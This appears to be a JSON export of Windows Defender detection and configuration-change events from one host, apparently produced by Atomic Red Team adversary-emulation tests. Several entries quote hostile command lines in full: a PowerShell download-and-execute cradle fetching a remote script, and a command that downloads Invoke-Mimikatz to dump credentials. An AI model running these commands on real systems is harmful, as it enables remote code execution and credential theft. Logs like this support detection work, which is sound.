    {
        "timestamp": "/Date(1783104326273)/",
        "source": "windows_defender",
        "event_id": 5007,
        "event_type": "defender_configuration_changed",
        "severity": "medium",
        "hostname": "NYLPC0LWVEN",
        "provider": "Microsoft-Windows-Windows Defender",
        "message": "Microsoft Defender Antivirus Configuration has changed. If this is an unexpected event you should review the settings as this may be the result of malware.\r\n \tOld value: \r\n \tNew value: HKLM\\SOFTWARE\\Microsoft\\Windows Defender\\Features\\EcsConfigs\\MpFC_Dlp_OnDemandUserConfigFetchEnabled = 0x1",
        "raw": {
            "TimeCreated": "/Date(1783104326273)/",
            "Id": 5007,
            "ProviderName": "Microsoft-Windows-Windows Defender",
            "MachineName": "NYLPC0LWVEN",
            "Message": "Microsoft Defender Antivirus Configuration has changed. If this is an unexpected event you should review the settings as this may be the result of malware.\r\n \tOld value: \r\n \tNew value: HKLM\\SOFTWARE\\Microsoft\\Windows Defender\\Features\\EcsConfigs\\MpFC_Dlp_OnDemandUserConfigFetchEnabled = 0x1"
        }
    },
    {
        "timestamp": "/Date(1783104132228)/",
        "source": "windows_defender",
        "event_id": 5007,
        "event_type": "defender_configuration_changed",
        "severity": "medium",
        "hostname": "NYLPC0LWVEN",
        "provider": "Microsoft-Windows-Windows Defender",
        "message": "Microsoft Defender Antivirus Configuration has changed. If this is an unexpected event you should review the settings as this may be the result of malware.\r\n \tOld value: HKLM\\SOFTWARE\\Microsoft\\Windows Defender\\CoreService\\WdConfigHash = 0x860CD30F\r\n \tNew value: HKLM\\SOFTWARE\\Microsoft\\Windows Defender\\CoreService\\WdConfigHash = 0xD363CE50",
        "raw": {
            "TimeCreated": "/Date(1783104132228)/",
            "Id": 5007,
            "ProviderName": "Microsoft-Windows-Windows Defender",
            "MachineName": "NYLPC0LWVEN",
            "Message": "Microsoft Defender Antivirus Configuration has changed. If this is an unexpected event you should review the settings as this may be the result of malware.\r\n \tOld value: HKLM\\SOFTWARE\\Microsoft\\Windows Defender\\CoreService\\WdConfigHash = 0x860CD30F\r\n \tNew value: HKLM\\SOFTWARE\\Microsoft\\Windows Defender\\CoreService\\WdConfigHash = 0xD363CE50"
        }
    },
    {
        "timestamp": "/Date(1783104042704)/",
        "source": "windows_defender",
        "event_id": 5007,
        "event_type": "defender_configuration_changed",
        "severity": "medium",
        "hostname": "NYLPC0LWVEN",
        "provider": "Microsoft-Windows-Windows Defender",
        "message": "Microsoft Defender Antivirus Configuration has changed. If this is an unexpected event you should review the settings as this may be the result of malware.\r\n \tOld value: HKLM\\SOFTWARE\\Microsoft\\Windows Defender\\UX Configuration\\ToastOrSsoTrigger = 0x1\r\n \tNew value: HKLM\\SOFTWARE\\Microsoft\\Windows Defender\\UX Configuration\\ToastOrSsoTrigger = 0x0",
        "raw": {
            "TimeCreated": "/Date(1783104042704)/",
            "Id": 5007,
            "ProviderName": "Microsoft-Windows-Windows Defender",
            "MachineName": "NYLPC0LWVEN",
            "Message": "Microsoft Defender Antivirus Configuration has changed. If this is an unexpected event you should review the settings as this may be the result of malware.\r\n \tOld value: HKLM\\SOFTWARE\\Microsoft\\Windows Defender\\UX Configuration\\ToastOrSsoTrigger = 0x1\r\n \tNew value: HKLM\\SOFTWARE\\Microsoft\\Windows Defender\\UX Configuration\\ToastOrSsoTrigger = 0x0"
        }
    },
    {
        "timestamp": "/Date(1783014686411)/",
        "source": "windows_defender",
        "event_id": 5007,
        "event_type": "defender_configuration_changed",
        "severity": "medium",
        "hostname": "NYLPC0LWVEN",
        "provider": "Microsoft-Windows-Windows Defender",
        "message": "Microsoft Defender Antivirus Configuration has changed. If this is an unexpected event you should review the settings as this may be the result of malware.\r\n \tOld value: HKLM\\SOFTWARE\\Microsoft\\Windows Defender\\CoreService\\WdConfigHash = 0xEF893DCF\r\n \tNew value: HKLM\\SOFTWARE\\Microsoft\\Windows Defender\\CoreService\\WdConfigHash = 0x860CD30F",
        "raw": {
            "TimeCreated": "/Date(1783014686411)/",
            "Id": 5007,
            "ProviderName": "Microsoft-Windows-Windows Defender",
            "MachineName": "NYLPC0LWVEN",
            "Message": "Microsoft Defender Antivirus Configuration has changed. If this is an unexpected event you should review the settings as this may be the result of malware.\r\n \tOld value: HKLM\\SOFTWARE\\Microsoft\\Windows Defender\\CoreService\\WdConfigHash = 0xEF893DCF\r\n \tNew value: HKLM\\SOFTWARE\\Microsoft\\Windows Defender\\CoreService\\WdConfigHash = 0x860CD30F"
        }
    },
    {
        "timestamp": "/Date(1783014302805)/",
        "source": "windows_defender",
        "event_id": 1117,
        "event_type": "remediation_started",
        "severity": "medium",
        "hostname": "NYLPC0LWVEN",
        "provider": "Microsoft-Windows-Windows Defender",
        "message": "Microsoft Defender Antivirus has detected malware or potentially unwanted software using Defender security intelligence and applied the remediation action defined in the security settings.\r\n For more information please see the following:\r\nhttps://go.microsoft.com/fwlink/?linkid=37020&name=Trojan:Win32/Commandrob.A!ml&threatid=2147849223&enterprise=0\r\n \tName: Trojan:Win32/Commandrob.A!ml\r\n \tID: 2147849223\r\n \tSeverity: Severe\r\n \tCategory: Trojan\r\n \tPath: CmdLine:_C:\\Windows\\System32\\cmd.exe /c powershell.exe -exec bypass -noprofile $comMsXml=New-Object -ComObject MsXml2.ServerXmlHttp;$comMsXml.Open('GET','https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1059.001/src/test.ps1',$False);$comMsXml.Send();IEX $comMsXml.ResponseTex\r\n \tDetection Origin: Unknown\r\n \tDetection Type: FastPath\r\n \tDetection Source: System\r\n \tUser: NT AUTHORITY\\SYSTEM\r\n \tProcess Name: Unknown\r\n \tAction: Remove\r\n \tAction Status:  No additional actions required\r\n \tError Code: 0x00000000\r\n \tError description: The operation completed successfully. \r\n \tSecurity intelligence Version: AV: 1.453.390.0, AS: 1.453.390.0, NIS: 1.453.390.0\r\n \tEngine Version: AM: 1.1.26050.11, NIS: 1.1.26050.11",
        "raw": {
            "TimeCreated": "/Date(1783014302805)/",
            "Id": 1117,
            "ProviderName": "Microsoft-Windows-Windows Defender",
            "MachineName": "NYLPC0LWVEN",
            "Message": "Microsoft Defender Antivirus has detected malware or potentially unwanted software using Defender security intelligence and applied the remediation action defined in the security settings.\r\n For more information please see the following:\r\nhttps://go.microsoft.com/fwlink/?linkid=37020&name=Trojan:Win32/Commandrob.A!ml&threatid=2147849223&enterprise=0\r\n \tName: Trojan:Win32/Commandrob.A!ml\r\n \tID: 2147849223\r\n \tSeverity: Severe\r\n \tCategory: Trojan\r\n \tPath: CmdLine:_C:\\Windows\\System32\\cmd.exe /c powershell.exe -exec bypass -noprofile $comMsXml=New-Object -ComObject MsXml2.ServerXmlHttp;$comMsXml.Open('GET','https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1059.001/src/test.ps1',$False);$comMsXml.Send();IEX $comMsXml.ResponseTex\r\n \tDetection Origin: Unknown\r\n \tDetection Type: FastPath\r\n \tDetection Source: System\r\n \tUser: NT AUTHORITY\\SYSTEM\r\n \tProcess Name: Unknown\r\n \tAction: Remove\r\n \tAction Status:  No additional actions required\r\n \tError Code: 0x00000000\r\n \tError description: The operation completed successfully. \r\n \tSecurity intelligence Version: AV: 1.453.390.0, AS: 1.453.390.0, NIS: 1.453.390.0\r\n \tEngine Version: AM: 1.1.26050.11, NIS: 1.1.26050.11"
        }
    },
    {
        "timestamp": "/Date(1783014273692)/",
        "source": "windows_defender",
        "event_id": 1116,
        "event_type": "malware_detected",
        "severity": "high",
        "hostname": "NYLPC0LWVEN",
        "provider": "Microsoft-Windows-Windows Defender",
        "message": "Microsoft Defender Antivirus has detected malware or other potentially unwanted software.\r\n For more information please see the following:\r\nhttps://go.microsoft.com/fwlink/?linkid=37020&name=Trojan:Win32/Commandrob.A!ml&threatid=2147849223&enterprise=0\r\n \tName: Trojan:Win32/Commandrob.A!ml\r\n \tID: 2147849223\r\n \tSeverity: Severe\r\n \tCategory: Trojan\r\n \tPath: CmdLine:_C:\\Windows\\System32\\cmd.exe /c powershell.exe -exec bypass -noprofile $comMsXml=New-Object -ComObject MsXml2.ServerXmlHttp;$comMsXml.Open('GET','https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1059.001/src/test.ps1',$False);$comMsXml.Send();IEX $comMsXml.ResponseTex\r\n \tDetection Origin: Unknown\r\n \tDetection Type: FastPath\r\n \tDetection Source: System\r\n \tUser: NT AUTHORITY\\SYSTEM\r\n \tProcess Name: Unknown\r\n \tSecurity intelligence Version: AV: 1.453.390.0, AS: 1.453.390.0, NIS: 1.453.390.0\r\n \tEngine Version: AM: 1.1.26050.11, NIS: 1.1.26050.11",
        "raw": {
            "TimeCreated": "/Date(1783014273692)/",
            "Id": 1116,
            "ProviderName": "Microsoft-Windows-Windows Defender",
            "MachineName": "NYLPC0LWVEN",
            "Message": "Microsoft Defender Antivirus has detected malware or other potentially unwanted software.\r\n For more information please see the following:\r\nhttps://go.microsoft.com/fwlink/?linkid=37020&name=Trojan:Win32/Commandrob.A!ml&threatid=2147849223&enterprise=0\r\n \tName: Trojan:Win32/Commandrob.A!ml\r\n \tID: 2147849223\r\n \tSeverity: Severe\r\n \tCategory: Trojan\r\n \tPath: CmdLine:_C:\\Windows\\System32\\cmd.exe /c powershell.exe -exec bypass -noprofile $comMsXml=New-Object -ComObject MsXml2.ServerXmlHttp;$comMsXml.Open('GET','https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1059.001/src/test.ps1',$False);$comMsXml.Send();IEX $comMsXml.ResponseTex\r\n \tDetection Origin: Unknown\r\n \tDetection Type: FastPath\r\n \tDetection Source: System\r\n \tUser: NT AUTHORITY\\SYSTEM\r\n \tProcess Name: Unknown\r\n \tSecurity intelligence Version: AV: 1.453.390.0, AS: 1.453.390.0, NIS: 1.453.390.0\r\n \tEngine Version: AM: 1.1.26050.11, NIS: 1.1.26050.11"
        }
    },
    {
        "timestamp": "/Date(1783014008367)/",
        "source": "windows_defender",
        "event_id": 1117,
        "event_type": "remediation_started",
        "severity": "medium",
        "hostname": "NYLPC0LWVEN",
        "provider": "Microsoft-Windows-Windows Defender",
        "message": "Microsoft Defender Antivirus has detected malware or potentially unwanted software using Defender security intelligence and applied the remediation action defined in the security settings.\r\n For more information please see the following:\r\nhttps://go.microsoft.com/fwlink/?linkid=37020&name=Trojan:PowerShell/Mimikatz.A&threatid=2147725502&enterprise=0\r\n \tName: Trojan:PowerShell/Mimikatz.A\r\n \tID: 2147725502\r\n \tSeverity: Severe\r\n \tCategory: Trojan\r\n \tPath: CmdLine:_C:\\Windows\\System32\\cmd.exe /c powershell.exe IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/f650520c4b1004daf8b3ec08007a0b945b91253a/Exfiltration/Invoke-Mimikatz.ps1'); Invoke-Mimikatz -DumpCreds\r\n \tDetection Origin: Unknown\r\n \tDetection Type: Concrete\r\n \tDetection Source: System\r\n \tUser: NT AUTHORITY\\SYSTEM\r\n \tProcess Name: Unknown\r\n \tAction: Remove\r\n \tAction Status:  No additional actions required\r\n \tError Code: 0x00000000\r\n \tError description: The operation completed successfully. \r\n \tSecurity intelligence Version: AV: 1.453.390.0, AS: 1.453.390.0, NIS: 1.453.390.0\r\n \tEngine Version: AM: 1.1.26050.11, NIS: 1.1.26050.11",
        "raw": {
            "TimeCreated": "/Date(1783014008367)/",
            "Id": 1117,
            "ProviderName": "Microsoft-Windows-Windows Defender",
            "MachineName": "NYLPC0LWVEN",
            "Message": "Microsoft Defender Antivirus has detected malware or potentially unwanted software using Defender security intelligence and applied the remediation action defined in the security settings.\r\n For more information please see the following:\r\nhttps://go.microsoft.com/fwlink/?linkid=37020&name=Trojan:PowerShell/Mimikatz.A&threatid=2147725502&enterprise=0\r\n \tName: Trojan:PowerShell/Mimikatz.A\r\n \tID: 2147725502\r\n \tSeverity: Severe\r\n \tCategory: Trojan\r\n \tPath: CmdLine:_C:\\Windows\\System32\\cmd.exe /c powershell.exe IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/f650520c4b1004daf8b3ec08007a0b945b91253a/Exfiltration/Invoke-Mimikatz.ps1'); Invoke-Mimikatz -DumpCreds\r\n \tDetection Origin: Unknown\r\n \tDetection Type: Concrete\r\n \tDetection Source: System\r\n \tUser: NT AUTHORITY\\SYSTEM\r\n \tProcess Name: Unknown\r\n \tAction: Remove\r\n \tAction Status:  No additional actions required\r\n \tError Code: 0x00000000\r\n \tError description: The operation completed successfully. \r\n \tSecurity intelligence Version: AV: 1.453.390.0, AS: 1.453.390.0, NIS: 1.453.390.0\r\n \tEngine Version: AM: 1.1.26050.11, NIS: 1.1.26050.11"
        }
    },
    {
        "timestamp": "/Date(1783013954718)/",
        "source": "windows_defender",
        "event_id": 1116,
        "event_type": "malware_detected",
        "severity": "high",
        "hostname": "NYLPC0LWVEN",
        "provider": "Microsoft-Windows-Windows Defender",
        "message": "Microsoft Defender Antivirus has detected malware or other potentially unwanted software.\r\n For more information please see the following:\r\nhttps://go.microsoft.com/fwlink/?linkid=37020&name=Trojan:PowerShell/Mimikatz.A&threatid=2147725502&enterprise=0\r\n \tName: Trojan:PowerShell/Mimikatz.A\r\n \tID: 2147725502\r\n \tSeverity: Severe\r\n \tCategory: Trojan\r\n \tPath: CmdLine:_C:\\Windows\\System32\\cmd.exe /c powershell.exe IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/f650520c4b1004daf8b3ec08007a0b945b91253a/Exfiltration/Invoke-Mimikatz.ps1'); Invoke-Mimikatz -DumpCreds\r\n \tDetection Origin: Unknown\r\n \tDetection Type: Concrete\r\n \tDetection Source: System\r\n \tUser: NT AUTHORITY\\SYSTEM\r\n \tProcess Name: Unknown\r\n \tSecurity intelligence Version: AV: 1.453.390.0, AS: 1.453.390.0, NIS: 1.453.390.0\r\n \tEngine Version: AM: 1.1.26050.11, NIS: 1.1.26050.11",
        "raw": {
            "TimeCreated": "/Date(1783013954718)/",
            "Id": 1116,
            "ProviderName": "Microsoft-Windows-Windows Defender",
            "MachineName": "NYLPC0LWVEN",
            "Message": "Microsoft Defender Antivirus has detected malware or other potentially unwanted software.\r\n For more information please see the following:\r\nhttps://go.microsoft.com/fwlink/?linkid=37020&name=Trojan:PowerShell/Mimikatz.A&threatid=2147725502&enterprise=0\r\n \tName: Trojan:PowerShell/Mimikatz.A\r\n \tID: 2147725502\r\n \tSeverity: Severe\r\n \tCategory: Trojan\r\n \tPath: CmdLine:_C:\\Windows\\System32\\cmd.exe /c powershell.exe IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/f650520c4b1004daf8b3ec08007a0b945b91253a/Exfiltration/Invoke-Mimikatz.ps1'); Invoke-Mimikatz -DumpCreds\r\n \tDetection Origin: Unknown\r\n \tDetection Type: Concrete\r\n \tDetection Source: System\r\n \tUser: NT AUTHORITY\\SYSTEM\r\n \tProcess Name: Unknown\r\n \tSecurity intelligence Version: AV: 1.453.390.0, AS: 1.453.390.0, NIS: 1.453.390.0\r\n \tEngine Version: AM: 1.1.26050.11, NIS: 1.1.26050.11"
        }
    },
    {
        "timestamp": "/Date(1783001273653)/",
        "source": "windows_defender",
        "event_id": 5007,
        "event_type": "defender_configuration_changed",
        "severity": "medium",
        "hostname": "NYLPC0LWVEN",
        "provider": "Microsoft-Windows-Windows Defender",
        "message": "Microsoft Defender Antivirus Configuration has changed. If this is an unexpected event you should review the settings as this may be the result of malware.\r\n \tOld value: HKLM\\SOFTWARE\\Microsoft\\Windows Defender\\CoreService\\WdConfigHash = 0xC028EBD5\r\n \tNew value: HKLM\\SOFTWARE\\Microsoft\\Windows Defender\\CoreService\\WdConfigHash = 0xEF893DCF",
        "raw": {
            "TimeCreated": "/Date(1783001273653)/",
            "Id": 5007,
            "ProviderName": "Microsoft-Windows-Windows Defender",
            "MachineName": "NYLPC0LWVEN",
            "Message": "Microsoft Defender Antivirus Configuration has changed. If this is an unexpected event you should review the settings as this may be the result of malware.\r\n \tOld value: HKLM\\SOFTWARE\\Microsoft\\Windows Defender\\CoreService\\WdConfigHash = 0xC028EBD5\r\n \tNew value: HKLM\\SOFTWARE\\Microsoft\\Windows Defender\\CoreService\\WdConfigHash = 0xEF893DCF"
        }
    },
    {
        "timestamp": "/Date(1783001228834)/",
        "source": "windows_defender",
        "event_id": 5007,
        "event_type": "defender_configuration_changed",
        "severity": "medium",
        "hostname": "NYLPC0LWVEN",
        "provider": "Microsoft-Windows-Windows Defender",
        "message": "Microsoft Defender Antivirus Configuration has changed. If this is an unexpected event you should review the settings as this may be the result of malware.\r\n \tOld value: HKLM\\SOFTWARE\\Microsoft\\Windows Defender\\UX Configuration\\ToastOrSsoTrigger = 0x0\r\n \tNew value: HKLM\\SOFTWARE\\Microsoft\\Windows Defender\\UX Configuration\\ToastOrSsoTrigger = 0x1",
        "raw": {
            "TimeCreated": "/Date(1783001228834)/",
            "Id": 5007,
            "ProviderName": "Microsoft-Windows-Windows Defender",
            "MachineName": "NYLPC0LWVEN",
            "Message": "Microsoft Defender Antivirus Configuration has changed. If this is an unexpected event you should review the settings as this may be the result of malware.\r\n \tOld value: HKLM\\SOFTWARE\\Microsoft\\Windows Defender\\UX Configuration\\ToastOrSsoTrigger = 0x0\r\n \tNew value: HKLM\\SOFTWARE\\Microsoft\\Windows Defender\\UX Configuration\\ToastOrSsoTrigger = 0x1"
        }
    },
    {
        "timestamp": "/Date(1782969814009)/",
        "source": "windows_defender",
        "event_id": 1117,
        "event_type": "remediation_started",
        "severity": "medium",
        "hostname": "NYLPC0LWVEN",
        "provider": "Microsoft-Windows-Windows Defender",
        "message": "Microsoft Defender Antivirus has detected malware or potentially unwanted software using Defender security intelligence and applied the remediation action defined in the security settings.\r\n For more information please see the following:\r\nhttps://go.microsoft.com/fwlink/?linkid=37020&name=Trojan:Win64/Hacktool.Phant0m!MSR&threatid=2147907146&enterprise=0\r\n \tName: Trojan:Win64/Hacktool.Phant0m!MSR\r\n \tID: 2147907146\r\n \tSeverity: Severe\r\n \tCategory: Trojan\r\n \tPath: file:_C:\\Users\\Admin\\Desktop\\caldera\\plugins\\atomic\\data\\atomic-red-team\\atomics\\T1685.001\\bin\\phant0m.exe\r\n \tDetection Origin: Local machine\r\n \tDetection Type: Concrete\r\n \tDetection Source: Real-Time Protection\r\n \tUser: NT AUTHORITY\\SYSTEM\r\n \tProcess Name: C:\\Windows\\System32\\dllhost.exe\r\n \tAction: Quarantine\r\n \tAction Status:  No additional actions required\r\n \tError Code: 0x00000000\r\n \tError description: The operation completed successfully. \r\n \tSecurity intelligence Version: AV: 1.453.382.0, AS: 1.453.382.0, NIS: 1.453.382.0\r\n \tEngine Version: AM: 1.1.26050.11, NIS: 1.1.26050.11",
        "raw": {
            "TimeCreated": "/Date(1782969814009)/",
            "Id": 1117,
            "ProviderName": "Microsoft-Windows-Windows Defender",
            "MachineName": "NYLPC0LWVEN",
            "Message": "Microsoft Defender Antivirus has detected malware or potentially unwanted software using Defender security intelligence and applied the remediation action defined in the security settings.\r\n For more information please see the following:\r\nhttps://go.microsoft.com/fwlink/?linkid=37020&name=Trojan:Win64/Hacktool.Phant0m!MSR&threatid=2147907146&enterprise=0\r\n \tName: Trojan:Win64/Hacktool.Phant0m!MSR\r\n \tID: 2147907146\r\n \tSeverity: Severe\r\n \tCategory: Trojan\r\n \tPath: file:_C:\\Users\\Admin\\Desktop\\caldera\\plugins\\atomic\\data\\atomic-red-team\\atomics\\T1685.001\\bin\\phant0m.exe\r\n \tDetection Origin: Local machine\r\n \tDetection Type: Concrete\r\n \tDetection Source: Real-Time Protection\r\n \tUser: NT AUTHORITY\\SYSTEM\r\n \tProcess Name: C:\\Windows\\System32\\dllhost.exe\r\n \tAction: Quarantine\r\n \tAction Status:  No additional actions required\r\n \tError Code: 0x00000000\r\n \tError description: The operation completed successfully. \r\n \tSecurity intelligence Version: AV: 1.453.382.0, AS: 1.453.382.0, NIS: 1.453.382.0\r\n \tEngine Version: AM: 1.1.26050.11, NIS: 1.1.26050.11"
        }
    },
    {
        "timestamp": "/Date(1782969814003)/",
        "source": "windows_defender",
        "event_id": 1117,
        "event_type": "remediation_started",
        "severity": "medium",
        "hostname": "NYLPC0LWVEN",
        "provider": "Microsoft-Windows-Windows Defender",
        "message": "Microsoft Defender Antivirus has detected malware or potentially unwanted software using Defender security intelligence and applied the remediation action defined in the security settings.\r\n For more information please see the following:\r\nhttps://go.microsoft.com/fwlink/?linkid=37020&name=Exploit:O97M/DDEDownloader.B&threatid=2147723943&enterprise=0\r\n \tName: Exploit:O97M/DDEDownloader.B\r\n \tID: 2147723943\r\n \tSeverity: Severe\r\n \tCategory: Exploit\r\n \tPath: file:_C:\\Users\\Admin\\Desktop\\caldera\\plugins\\atomic\\data\\atomic-red-team\\atomics\\T1559.002\\bin\\DDE_Document.docx; file:_C:\\Users\\Admin\\Desktop\\caldera\\plugins\\atomic\\data\\atomic-red-team\\atomics\\T1559.002\\T1559.002.md\r\n \tDetection Origin: Local machine\r\n \tDetection Type: Concrete\r\n \tDetection Source: Real-Time Protection\r\n \tUser: NT AUTHORITY\\SYSTEM\r\n \tProcess Name: C:\\Windows\\System32\\dllhost.exe\r\n \tAction: Quarantine\r\n \tAction Status:  No additional actions required\r\n \tError Code: 0x00000000\r\n \tError description: The operation completed successfully. \r\n \tSecurity intelligence Version: AV: 1.453.382.0, AS: 1.453.382.0, NIS: 1.453.382.0\r\n \tEngine Version: AM: 1.1.26050.11, NIS: 1.1.26050.11",
        "raw": {
            "TimeCreated": "/Date(1782969814003)/",
            "Id": 1117,
            "ProviderName": "Microsoft-Windows-Windows Defender",
            "MachineName": "NYLPC0LWVEN",
            "Message": "Microsoft Defender Antivirus has detected malware or potentially unwanted software using Defender security intelligence and applied the remediation action defined in the security settings.\r\n For more information please see the following:\r\nhttps://go.microsoft.com/fwlink/?linkid=37020&name=Exploit:O97M/DDEDownloader.B&threatid=2147723943&enterprise=0\r\n \tName: Exploit:O97M/DDEDownloader.B\r\n \tID: 2147723943\r\n \tSeverity: Severe\r\n \tCategory: Exploit\r\n \tPath: file:_C:\\Users\\Admin\\Desktop\\caldera\\plugins\\atomic\\data\\atomic-red-team\\atomics\\T1559.002\\bin\\DDE_Document.docx; file:_C:\\Users\\Admin\\Desktop\\caldera\\plugins\\atomic\\data\\atomic-red-team\\atomics\\T1559.002\\T1559.002.md\r\n \tDetection Origin: Local machine\r\n \tDetection Type: Concrete\r\n \tDetection Source: Real-Time Protection\r\n \tUser: NT AUTHORITY\\SYSTEM\r\n \tProcess Name: C:\\Windows\\System32\\dllhost.exe\r\n \tAction: Quarantine\r\n \tAction Status:  No additional actions required\r\n \tError Code: 0x00000000\r\n \tError description: The operation completed successfully. \r\n \tSecurity intelligence Version: AV: 1.453.382.0, AS: 1.453.382.0, NIS: 1.453.382.0\r\n \tEngine Version: AM: 1.1.26050.11, NIS: 1.1.26050.11"
        }
    },
    {
        "timestamp": "/Date(1782969813998)/",
        "source": "windows_defender",
        "event_id": 1117,
        "event_type": "remediation_started",
        "severity": "medium",
        "hostname": "NYLPC0LWVEN",
        "provider": "Microsoft-Windows-Windows Defender",
        "message": "Microsoft Defender Antivirus has detected malware or potentially unwanted software using Defender security intelligence and applied the remediation action defined in the security settings.\r\n For more information please see the following:\r\nhttps://go.microsoft.com/fwlink/?linkid=37020&name=Trojan:Win32/PShellBr.YA!MTB&threatid=2147734994&enterprise=0\r\n \tName: Trojan:Win32/PShellBr.YA!MTB\r\n \tID: 2147734994\r\n \tSeverity: Severe\r\n \tCategory: Trojan\r\n \tPath: file:_C:\\Users\\Admin\\Desktop\\caldera\\plugins\\atomic\\data\\atomic-red-team\\atomics\\T1553.005\\T1553.005.md; file:_C:\\Users\\Admin\\Desktop\\caldera\\plugins\\atomic\\data\\atomic-red-team\\atomics\\T1553.005\\T1553.005.yaml\r\n \tDetection Origin: Local machine\r\n \tDetection Type: Concrete\r\n \tDetection Source: Real-Time Protection\r\n \tUser: NT AUTHORITY\\SYSTEM\r\n \tProcess Name: C:\\Windows\\System32\\dllhost.exe\r\n \tAction: Quarantine\r\n \tAction Status:  No additional actions required\r\n \tError Code: 0x00000000\r\n \tError description: The operation completed successfully. \r\n \tSecurity intelligence Version: AV: 1.453.382.0, AS: 1.453.382.0, NIS: 1.453.382.0\r\n \tEngine Version: AM: 1.1.26050.11, NIS: 1.1.26050.11",
        "raw": {
            "TimeCreated": "/Date(1782969813998)/",
            "Id": 1117,
            "ProviderName": "Microsoft-Windows-Windows Defender",
            "MachineName": "NYLPC0LWVEN",
            "Message": "Microsoft Defender Antivirus has detected malware or potentially unwanted software using Defender security intelligence and applied the remediation action defined in the security settings.\r\n For more information please see the following:\r\nhttps://go.microsoft.com/fwlink/?linkid=37020&name=Trojan:Win32/PShellBr.YA!MTB&threatid=2147734994&enterprise=0\r\n \tName: Trojan:Win32/PShellBr.YA!MTB\r\n \tID: 2147734994\r\n \tSeverity: Severe\r\n \tCategory: Trojan\r\n \tPath: file:_C:\\Users\\Admin\\Desktop\\caldera\\plugins\\atomic\\data\\atomic-red-team\\atomics\\T1553.005\\T1553.005.md; file:_C:\\Users\\Admin\\Desktop\\caldera\\plugins\\atomic\\data\\atomic-red-team\\atomics\\T1553.005\\T1553.005.yaml\r\n \tDetection Origin: Local machine\r\n \tDetection Type: Concrete\r\n \tDetection Source: Real-Time Protection\r\n \tUser: NT AUTHORITY\\SYSTEM\r\n \tProcess Name: C:\\Windows\\System32\\dllhost.exe\r\n \tAction: Quarantine\r\n \tAction Status:  No additional actions required\r\n \tError Code: 0x00000000\r\n \tError description: The operation completed successfully. \r\n \tSecurity intelligence Version: AV: 1.453.382.0, AS: 1.453.382.0, NIS: 1.453.382.0\r\n \tEngine Version: AM: 1.1.26050.11, NIS: 1.1.26050.11"
        }
    },
    {
        "timestamp": "/Date(1782969813993)/",
        "source": "windows_defender",
        "event_id": 1117,
        "event_type": "remediation_started",
        "severity": "medium",
        "hostname": "NYLPC0LWVEN",
        "provider": "Microsoft-Windows-Windows Defender",
        "message": "Microsoft Defender Antivirus has detected malware or potentially unwanted software using Defender security intelligence and applied the remediation action defined in the security settings.\r\n For more information please see the following:\r\nhttps://go.microsoft.com/fwlink/?linkid=37020&name=HackTool:Win32/PortMon!AMTB&threatid=2147972445&enterprise=0\r\n \tName: HackTool:Win32/PortMon!AMTB\r\n \tID: 2147972445\r\n \tSeverity: High\r\n \tCategory: Tool\r\n \tPath: file:_C:\\Users\\Admin\\Desktop\\caldera\\plugins\\atomic\\data\\atomic-red-team\\atomics\\T1547.010\\bin\\PortMonitor.dll\r\n \tDetection Origin: Local machine\r\n \tDetection Type: Concrete\r\n \tDetection Source: Real-Time Protection\r\n \tUser: NT AUTHORITY\\SYSTEM\r\n \tProcess Name: C:\\Windows\\System32\\dllhost.exe\r\n \tAction: Quarantine\r\n \tAction Status:  No additional actions required\r\n \tError Code: 0x00000000\r\n \tError description: The operation completed successfully. \r\n \tSecurity intelligence Version: AV: 1.453.382.0, AS: 1.453.382.0, NIS: 1.453.382.0\r\n \tEngine Version: AM: 1.1.26050.11, NIS: 1.1.26050.11",
        "raw": {
            "TimeCreated": "/Date(1782969813993)/",
            "Id": 1117,
            "ProviderName": "Microsoft-Windows-Windows Defender",
            "MachineName": "NYLPC0LWVEN",
            "Message": "Microsoft Defender Antivirus has detected malware or potentially unwanted software using Defender security intelligence and applied the remediation action defined in the security settings.\r\n For more information please see the following:\r\nhttps://go.microsoft.com/fwlink/?linkid=37020&name=HackTool:Win32/PortMon!AMTB&threatid=2147972445&enterprise=0\r\n \tName: HackTool:Win32/PortMon!AMTB\r\n \tID: 2147972445\r\n \tSeverity: High\r\n \tCategory: Tool\r\n \tPath: file:_C:\\Users\\Admin\\Desktop\\caldera\\plugins\\atomic\\data\\atomic-red-team\\atomics\\T1547.010\\bin\\PortMonitor.dll\r\n \tDetection Origin: Local machine\r\n \tDetection Type: Concrete\r\n \tDetection Source: Real-Time Protection\r\n \tUser: NT AUTHORITY\\SYSTEM\r\n \tProcess Name: C:\\Windows\\System32\\dllhost.exe\r\n \tAction: Quarantine\r\n \tAction Status:  No additional actions required\r\n \tError Code: 0x00000000\r\n \tError description: The operation completed successfully. \r\n \tSecurity intelligence Version: AV: 1.453.382.0, AS: 1.453.382.0, NIS: 1.453.382.0\r\n \tEngine Version: AM: 1.1.26050.11, NIS: 1.1.26050.11"
        }
    },
    {
        "timestamp": "/Date(1782969813987)/",
        "source": "windows_defender",
        "event_id": 1117,
        "event_type": "remediation_started",
        "severity": "medium",
        "hostname": "NYLPC0LWVEN",
        "provider": "Microsoft-Windows-Windows Defender",
        "message": "Microsoft Defender Antivirus has detected malware or potentially unwanted software using Defender security intelligence and applied the remediation action defined in the security settings.\r\n For more information please see the following:\r\nhttps://go.microsoft.com/fwlink/?linkid=37020&name=Trojan:Win32/Wacatac.H!ml&threatid=2147814523&enterprise=0\r\n \tName: Trojan:Win32/Wacatac.H!ml\r\n \tID: 2147814523\r\n \tSeverity: Severe\r\n \tCategory: Trojan\r\n \tPath: file:_C:\\Users\\Admin\\Desktop\\caldera\\plugins\\atomic\\data\\atomic-red-team\\atomics\\T1546\\bin\\AltWinSock2DLL.dll\r\n \tDetection Origin: Local machine\r\n \tDetection Type: FastPath\r\n \tDetection Source: Real-Time Protection\r\n \tUser: NT AUTHORITY\\SYSTEM\r\n \tProcess Name: C:\\Windows\\System32\\dllhost.exe\r\n \tAction: Quarantine\r\n \tAction Status:  No additional actions required\r\n \tError Code: 0x00000000\r\n \tError description: The operation completed successfully. \r\n \tSecurity intelligence Version: AV: 